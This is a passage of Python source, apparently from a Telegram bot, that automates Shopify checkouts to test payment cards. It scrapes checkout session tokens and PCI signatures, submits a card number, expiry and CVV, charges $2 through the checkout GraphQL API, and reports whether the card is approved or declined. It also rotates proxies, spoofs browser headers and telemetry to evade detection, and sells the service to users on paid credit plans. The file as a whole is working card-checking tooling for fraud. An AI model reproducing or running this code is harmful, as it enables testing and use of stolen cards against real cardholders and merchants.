        try:
            resp = await self.client.get(
                f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r=AQABnkM5xJCZpPtGkHegdHkf6umxo7ulKWF4CF4C23MxLwk&auto_redirect=false&edge_redirect=true&skip_shop_pay=true",
                headers=headers,
                timeout=25,
                follow_redirects=True
            )
            
            self.checkout_url = str(resp.url)
            html = resp.text
            
            # Extract session token
            m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
            if not m:
                m = re.search(r'"sessionToken"\s*:\s*"(AAEB[^"]+)"', html)
            if not m:
                m = re.search(r'(AAEB[A-Za-z0-9_\-]{30,})', html)
            if m:
                self.session_token = m.group(1)
                self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "HTML")
            
            # Extract signature (CRITICAL for PCI)
            m = re.search(r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"', html)
            if not m:
                m = re.search(r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"', html)
            if not m:
                m = re.search(r'"signature"\s*:\s*"(eyJ[^"]+)"', html)
            if not m:
                m = re.search(r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)', html)
            if m:
                self.signature = m.group(1)
                self.logger.data_extracted("Signature", self.signature[:20] + "...", "HTML - CRITICAL")
            
            # Extract stable ID
            m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', html)
            if m:
                self.stable_id = m.group(1)
            else:
                self.stable_id = str(uuid.uuid4())
            self.logger.data_extracted("Stable ID", self.stable_id, "Extracted/Generated")
            
            # Extract queue token
            m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
            if not m:
                m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html)
            self.queue_token = m.group(1) if m else None
            if self.queue_token:
                self.logger.data_extracted("Queue Token", self.queue_token[:20] + "...", "HTML")
            
            # Extract payment method identifier
            m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
            if not m:
                m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html)
            self.payment_method_identifier = m.group(1) if m else "c8cc804c79e3a3a438a6233f2a8d97b0"
            
            # Extract build ID
            m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', html)
            if not m:
                m = re.search(r'/build/([a-f0-9]{40})/', html)
            self.build_id = m.group(1) if m else 'd337b60249d314b13499c517706706e019af3129'
            
            # Extract PCI build hash
            pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
            self.pci_build_hash = pci_m.group(1) if pci_m else 'a8e4a94'
            
            if not self.session_token:
                self.logger.error_log("TOKEN", "Failed to extract session token")
                return False
            
            self.logger.success_log("All tokens extracted successfully")
            return True
            
        except Exception as e:
            self.logger.error_log("TOKEN_EXTRACT", str(e))
            return False

    # ============ STEP 9: VAULT CARD (PCI) ============
    async def vault_card(self, cc, mes, ano, cvv):
        """Step 9: Vault card via PCI - CRITICAL: must use real signature"""
        self.step(9, "VAULT CARD", "Vaulting card via PCI")
        
        if not self.signature:
            self.logger.error_log("PCI", "No signature available - cannot vault card")
            return None
        
        card_number = cc.replace(" ", "").replace("-", "")
        year_full = ano if len(ano) == 4 else f"20{ano}"
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': f'https://checkout.pci.shopifyinc.com/build/{self.pci_build_hash}/number-ltr.html?identifier=&locationURL={self.checkout_url or ""}',
            'sec-ch-ua': self.CH_UA,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'none',
            'user-agent': self.UA,
            'priority': 'u=1, i',
            'shopify-identification-signature': self.signature  # CRITICAL
        }
        
        payload = {
            "credit_card": {
                "number": card_number,
                "month": int(mes.strip()),
                "year": int(year_full),
                "verification_value": cvv.strip(),
                "start_month": None,
                "start_year": None,
                "issue_number": "",
                "name": self.full_name
            },
            "payment_session_scope": self.shop_domain
        }
        
        try:
            # Send telemetry before vaulting
            await self._send_pci_telemetry("HostedFields_CardFields_vaultCard_called", "counter", 1)
            
            resp = await self.client.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                headers=headers,
                json=payload,
                timeout=30
            )
            
            if resp.status_code in (200, 201):
                vault_data = resp.json()
                self.vault_id = vault_data.get('id')
                
                if self.vault_id:
                    self.logger.data_extracted("Vault ID", self.vault_id[:30] + "...", "PCI")
                    
                    # Send telemetry after successful vault
                    await self._send_pci_telemetry("HostedFields_CardFields_form_submitted", "counter", 1)
                    await self._send_pci_telemetry("HostedFields_CardFields_deposit_time", "histogram", 325)
                    
                    return self.vault_id
                else:
                    self.logger.error_log("PCI", "No vault ID in response")
                    return None
            else:
                self.logger.error_log("PCI", f"Vault failed with status {resp.status_code}")
                return None
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"PCI proxy error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return None
        except Exception as e:
            self.logger.error_log("PCI_ERROR", str(e))
            return None

    async def _send_pci_telemetry(self, metric_name, metric_type, value):
        """Send PCI telemetry (non-critical)"""
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/',
                'sec-ch-ua': self.CH_UA,
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': self.UA,
                'priority': 'u=1, i'
            }
            
            tags = {}
            if metric_name == "HostedFields_CardFields_deposit_time":
                tags = {"retries": 10, "status": 200, "cardsinkUrl": "/sessions"}
            
            body = {
                "service": "hosted-fields",
                "metrics": [{
                    "type": metric_type,
                    "value": value,
                    "name": metric_name,
                    "tags": tags
                }]
            }
            
            async with httpx.AsyncClient(timeout=5) as tele_client:
                await tele_client.post(
                    "https://us-central1-shopify-instrumentat-ff788286.cloudfunctions.net/telemetry",
                    headers=headers,
                    json=body
                )
        except:
            pass

    # ============ STEP 10: SUBMIT FOR COMPLETION ============
    async def submit_for_completion(self, cc):
        """Step 10: SubmitForCompletion with FULL mutation"""
        self.step(10, "SUBMIT PAYMENT", "Finalizing payment via full GraphQL mutation")
        
        if not self.session_token or not self.vault_id:
            return None
        
        url = f"{self.graphql_base}/checkouts/unstable/graphql"
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': self.checkout_url,
            'sec-ch-ua': self.CH_UA,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.UA,
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': self.checkout_token,
            'x-checkout-web-build-id': self.build_id
        }
        
        attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
        _raw_cc = cc.replace(' ', '').replace('-', '')
        card_bin = _raw_cc[:8] if len(_raw_cc) >= 8 else _raw_cc
        
        # CRITICAL FIELDS that were missing:
        payload = {
            "query": SUBMIT_MUTATION,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {
                    "requestUrl": self.checkout_url,
                    "pageId": str(uuid.uuid4()).upper()
                },
                "input": {
                    "checkpointData": None,  # MISSING BEFORE - CRITICAL
                    "sessionInput": {"sessionToken": self.session_token},
                    "queueToken": self.queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": self.address['address1'],
                                    "address2": "",
                                    "city": self.address['city'],
                                    "countryCode": self.address['countryCode'],
                                    "postalCode": self.address['postalCode'],
                                    "company": self.address['company'],
                                    "firstName": self.address['firstName'],
                                    "lastName": self.address['lastName'],
                                    "zoneCode": self.address['zoneCode'],
                                    "phone": self.address['phone'],
                                    "oneTimeUse": False
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {"phone": self.address['phone']}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": self.stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {"items": {"value": 2}},
                            "expectedTotalPrice": {"any": True},
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": self.payment_method_identifier,
                                    "sessionId": self.vault_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": self.address['address1'],
                                            "address2": "",
                                            "city": self.address['city'],
                                            "countryCode": self.address['countryCode'],
                                            "postalCode": self.address['postalCode'],
                                            "company": self.address['company'],
                                            "firstName": self.address['firstName'],
                                            "lastName": self.address['lastName'],
                                            "zoneCode": self.address['zoneCode'],
                                            "phone": self.address['phone']
                                        }
                                    },
                                    "cardSource": None
                                },
                                "giftCardPaymentMethod": None,
                                "redeemablePaymentMethod": None,
                                "walletPaymentMethod": None,
                                "walletsPlatformPaymentMethod": None,
                                "localPaymentMethod": None,
                                "paymentOnDeliveryMethod": None,
                                "paymentOnDeliveryMethod2": None,
                                "manualPaymentMethod": None,
                                "customPaymentMethod": None,
                                "offsitePaymentMethod": None,
                                "customOnsitePaymentMethod": None,
                                "deferredPaymentMethod": None,
                                "customerCreditCardPaymentMethod": None,
                                "paypalBillingAgreementPaymentMethod": None,
                                "remotePaymentInstrument": None
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": self.address['address1'],
                                "address2": "",
                                "city": self.address['city'],
                                "countryCode": self.address['countryCode'],
                                "postalCode": self.address['postalCode'],
                                "company": self.address['company'],
                                "firstName": self.address['firstName'],
                                "lastName": self.address['lastName'],
                                "zoneCode": self.address['zoneCode'],
                                "phone": self.address['phone']
                            }
                        },
                        "creditCardBin": card_bin  # CRITICAL
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": "USD",
                            "countryCode": "US"
                        },
                        "email": self.email,
                        "emailChanged": False,
                        "phoneCountryCode": "US",
                        "marketingConsent": [
                            {"sms": {"consentState": "DECLINED", "value": self.address['phone'], "countryCode": "US"}},
                            {"email": {"consentState": "GRANTED", "value": self.email}}
                        ],
                        "shopPayOptInPhone": {
                            "number": self.address['phone'],
                            "countryCode": "US"
                        },
                        "rememberMe": False,
                        "setShippingAddressAsDefault": False  # MISSING BEFORE
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"any": True},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "note": {
                        "message": None,
                        "customAttributes": [  # MISSING BEFORE
                            {"key": "gorgias.guest_id", "value": self.client_id or ""},
                            {"key": "gorgias.session_id", "value": str(uuid.uuid4())}
                        ]
                    },
                    "localizationExtension": {"fields": []},
                    "shopPayArtifact": {  # MISSING BEFORE
                        "optIn": {
                            "vaultEmail": "",
                            "vaultPhone": self.address['phone'],
                            "optInSource": "REMEMBER_ME"
                        }
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": []
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "captcha": None,  # MISSING BEFORE
                    "cartMetafields": []
                }
            }
        }
        
        max_retries = 12
        
        for attempt_num in range(max_retries):
            try:
                resp = await self.client.post(url, json=payload, headers=headers, timeout=30)
                
                if resp.status_code != 200:
                    if attempt_num < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    return None
                
                res = resp.json()
                
                if 'errors' in res and res.get('data') is None:
                    if attempt_num < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    return None
                
                data = res.get('data', {})
                submit = data.get('submitForCompletion', {})
                typename = submit.get('__typename', '')
                
                if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                    receipt = submit.get('receipt', {})
                    receipt_id = receipt.get('id')
                    if receipt_id:
                        self.logger.data_extracted("Receipt ID", receipt_id.split('/')[-1], "Submit")
                    return receipt_id
                
                elif typename == 'SubmitFailed':
                    reason = submit.get('reason', 'UNKNOWN')
                    self.logger.error_log("SUBMIT_FAILED", reason)
                    return None
                
                elif typename == 'Throttled':
                    poll_after = submit.get('pollAfter', 1000)
                    self.queue_token = submit.get('queueToken', self.queue_token)
                    await asyncio.sleep(poll_after / 1000.0)
                    payload['variables']['input']['queueToken'] = self.queue_token
                    continue
                
                elif typename == 'CheckpointDenied':
                    self.logger.error_log("CHECKPOINT", "Checkpoint denied")
                    return None
                
                elif typename == 'SubmitRejected':
                    errors = submit.get('errors', [])
                    codes = [e.get('code', '') for e in errors]
                    
                    if 'WAITING_PENDING_TERMS' in codes:
                        await asyncio.sleep(0.5)
                        continue
                    
                    # Return the real error code
                    if codes:
                        return f"REJECTED_{codes[0]}"
                    
                    return None
                
                else:
                    if attempt_num < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    return None
                    
            except httpx.ProxyError:
                self.logger.error_log("PROXY", "Submit proxy error")
                mark_proxy_failed(self.proxy_url)
                self.proxy_status = "Dead 🚫"
                return None
            except httpx.TimeoutException:
                if attempt_num < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                return None
            except Exception as e:
                self.logger.error_log("SUBMIT_ERROR", str(e))
                if attempt_num < max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                return None
        
        return None

    # ============ STEP 11: POLL FOR RECEIPT ============
    async def poll_for_receipt(self, receipt_id):
        """Step 11: Poll for receipt status with detailed query"""
        self.step(11, "POLL RECEIPT", "Polling for payment status")
        
        url = f"{self.graphql_base}/checkouts/unstable/graphql"
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'referer': self.checkout_url,
            'sec-ch-ua': self.CH_UA,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self.UA,
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'no',
            'x-checkout-web-source-id': self.checkout_token,
            'x-checkout-web-build-id': self.build_id
        }
        
        for i in range(15):
            try:
                poll_payload = {
                    "query": POLL_MUTATION,
                    "operationName": "PollForReceipt",
                    "variables": {
                        "receiptId": receipt_id,
                        "sessionToken": self.session_token
                    }
                }
                
                resp = await self.client.post(url, json=poll_payload, headers=headers, timeout=25)
                
                if resp.status_code != 200:
                    await asyncio.sleep(3)
                    continue
                
                data = resp.json()
                receipt = data.get('data', {}).get('receipt', {})
                typename = receipt.get('__typename', '')
                
                if typename == 'ProcessedReceipt':
                    order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                    self.logger.success_log("Payment processed!", f"Order: {order_id}")
                    return True, f"ORDER_PLACED - {order_id}"
                
                elif typename == 'ActionRequiredReceipt':
                    action = receipt.get('action', {})
                    action_url = action.get('url', '') or action.get('offsiteRedirect', '')
                    if action_url:
                        self.logger.data_extracted("3DS URL", action_url[:50] + "...", "Action required")
                        return False, "3D_SECURE_REQUIRED"
                    else:
                        try:
                            cdata = json.loads(action.get('challengeData', '{}'))
                            action_url = cdata.get('acsUrl', '') or cdata.get('url', '')
                        except:
                            pass
                    return False, "3D_SECURE_REQUIRED"
                
                elif typename == 'FailedReceipt':
                    err = receipt.get('processingError', {})
                    code = err.get('code', 'GENERIC_ERROR')
                    msg = err.get('messageUntranslated', '')
                    self.logger.error_log("FAILED", f"{code}: {msg}")
                    return False, f"DECLINED - {code}"
                
                elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
                    delay = receipt.get('pollDelay', 4000)
                    poll_delay_sec = delay / 1000.0
                    self.step(11, f"POLL {i+1}", f"Still processing", f"Wait: {poll_delay_sec:.1f}s", "WAIT")
                    await asyncio.sleep(poll_delay_sec)
                    continue
                
            except Exception as e:
                self.logger.error_log("POLL_ERROR", str(e))
                await asyncio.sleep(3)
                continue
        
        return False, "DECLINED - POLL_TIMEOUT"

    # ============ SEND PAYMENT SUBMITTED TELEMETRY ============
    async def send_payment_telemetry(self):
        """Send payment_submitted telemetry event"""
        try:
            headers = self.get_headers({
                'content-type': 'text/plain;charset=UTF-8',
                'origin': self.base_url,
                'sec-fetch-mode': 'no-cors',
                'priority': 'u=4, i'
            })
            
            now_ms = int(time.time() * 1000)
            event_id = f"sh-{str(uuid.uuid4()).upper()[:23]}"
            
            body = {
                "events": [{
                    "schema_id": "storefront_customer_tracking/4.27",
                    "payload": {
                        "api_client_id": 580111,
                        "event_id": event_id,
                        "event_name": "payment_info_submitted",
                        "shop_id": int(self.shop_id),
                        "total_value": 2,
                        "currency": "USD",
                        "event_time": now_ms,
                        "event_source_url": self.checkout_url or self.base_url,
                        "unique_token": self.client_id,
                        "page_id": str(uuid.uuid4()).upper(),
                        "deprecated_visit_token": self.visit_token,
                        "session_id": f"sh-{str(uuid.uuid4()).upper()[:23]}",
                        "source": "trekkie-storefront-renderer",
                        "ccpa_enforced": True,
                        "gdpr_enforced": False,
                        "is_persistent_cookie": True,
                        "analytics_allowed": True,
                        "marketing_allowed": True,
                        "sale_of_data_allowed": False,
                        "preferences_allowed": True,
                        "shopify_emitted": True
                    },
                    "metadata": {"event_created_at_ms": now_ms}
                }],
                "metadata": {"event_sent_at_ms": now_ms}
            }
            
            await self.client.post(
                f"{self.base_url}/.well-known/shopify/monorail/unstable/produce_batch",
                headers=headers,
                content=json.dumps(body),
                timeout=15
            )
        except:
            pass

    # ============ MAIN EXECUTION FLOW ============
    async def execute_checkout(self, cc, mes, ano, cvv):
        """Main checkout execution flow"""
        try:
            # Step 0: Get proxy
            self.step(0, "GET PROXY", "Getting proxy")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies available")
                    self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
                else:
                    self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30, follow_redirects=True)
                    self.proxy_status = "Live ⚡️"
                    self.proxy_used = True
                    self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...", "Proxy System")
            else:
                self.proxy_status = "No Proxy"
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
            
            # Step 1: Init session
            if not await self.init_session():
                return False, "SESSION_INIT_FAILED"
            await asyncio.sleep(random.uniform(0.3, 0.6))
            
            # Step 2: Find product
            if not await self.find_product():
                return False, "PRODUCT_NOT_FOUND"
            await asyncio.sleep(random.uniform(0.3, 0.6))
            
            # Step 3: Add to cart
            if not await self.add_to_cart():
                return False, "ADD_TO_CART_FAILED"
            await asyncio.sleep(random.uniform(0.3, 0.6))
            
            # Step 4: Send telemetry
            await self.send_telemetry()
            await asyncio.sleep(random.uniform(0.2, 0.4))
            
            # Step 5: View cart
            await self.view_cart_page()
            await asyncio.sleep(random.uniform(0.3, 0.6))
            
            # Step 6: Refresh cart
            await self.refresh_cart()
            await asyncio.sleep(random.uniform(0.2, 0.4))
            
            # Step 7: Start checkout
            if not await self.start_checkout():
                return False, "CHECKOUT_START_FAILED"
            await asyncio.sleep(random.uniform(0.5, 1.0))
            
            # Step 8: Extract tokens
            if not await self.extract_checkout_tokens():
                return False, "TOKEN_EXTRACTION_FAILED"
            await asyncio.sleep(random.uniform(0.3, 0.6))
            
            # Step 9: Vault card
            vault_result = await self.vault_card(cc, mes, ano, cvv)
            if not vault_result:
                return False, "CARD_VAULT_FAILED"
            await asyncio.sleep(random.uniform(0.5, 1.0))
            
            # Step 10: Submit for completion
            submit_result = await self.submit_for_completion(cc)
            if not submit_result:
                return False, "SUBMIT_FAILED"
            
            # If submit returned a rejection with error code
            if isinstance(submit_result, str) and submit_result.startswith("REJECTED_"):
                error_code = submit_result.replace("REJECTED_", "")
                return False, f"DECLINED - {error_code}"
            
            # Send payment telemetry
            await self.send_payment_telemetry()
            
            # Step 11: Poll for receipt
            success, result = await self.poll_for_receipt(submit_result)
            
            return success, result
            
        except Exception as e:
            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
            return False, f"ERROR: {str(e)[:50]}"
        finally:
            if self.client:
                await self.client.aclose()


# ========== MAIN CHECKER CLASS ==========
class ShopifyKauffmanChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            parsed = parse_card_input(card_details)
            if not parsed:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)

            cc, mes, ano, cvv = parsed

            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data, self.proxy_status)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data, self.proxy_status)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            checker = ShopifyKauffmanCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            self.proxy_status = checker.proxy_status

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data, self.proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            self.logger.error_log("UNKNOWN", str(e))
            try:
                cc = parsed[0] if 'parsed' in locals() else ""
                mes = parsed[1] if 'parsed' in locals() else ""
                ano = parsed[2] if 'parsed' in locals() else ""
                cvv = parsed[3] if 'parsed' in locals() else ""
            except:
                cc = mes = ano = cvv = ""
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:30]}", elapsed_time, username, user_data, self.proxy_status)


# ========== COMMAND HANDLER ==========
@Client.on_message(filters.command(["si", ".si", "$si"]))
@auth_and_free_restricted
async def handle_shopify_kauffman(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        can_use, wait_time = check_cooldown(user_id, "si")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE 2.00$]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/si</code>
🠪 <b>Usage</b>: <code>/si cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/si 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Shopify Charge 2$ - Direct Checkout</code>""")
            return

        full_text = message.text
        command_parts = full_text.split(maxsplit=1)
        if len(command_parts) < 2:
            await message.reply("Please provide card details")
            return
        
        card_input = command_parts[1].strip()

        parsed = parse_card_input(card_input)
        if not parsed:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Could not extract card details.
🠪 <b>Format</b>: <code>cc|mm|yy|cvv</code>
━━━━━━━━━━━━━""")
            return

        cc, mes, ano, cvv = parsed

        processing_msg = await message.reply(
            f"""
<b>[#Shopify Charge 2.00$] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 2.00$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Initiating...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Processing... Please wait.</b>
"""
        )

        checker = ShopifyKauffmanChecker(user_id)

        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                result = await charge_processor.execute_charge_command(
                    user_id,
                    checker.check_card,
                    card_input,
                    username,
                    user_data,
                    credits_needed=2,
                    command_name="si",
                    gateway_name="Shopify Charge 2.00$"
                )

                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)

            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                try:
                    result_text = await checker.check_card(card_input, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            try:
                result_text = await checker.check_card(card_input, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: `{str(e)[:100]}`
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
